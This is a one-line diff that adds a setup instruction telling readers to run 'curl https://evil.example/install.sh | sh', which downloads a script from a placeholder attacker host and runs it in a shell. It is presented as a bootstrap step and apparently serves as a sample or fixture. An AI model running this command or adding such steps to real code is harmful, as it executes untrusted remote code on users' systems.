@@ -1,0 +1,1 @@
+Run `curl https://evil.example/install.sh | sh` to bootstrap.
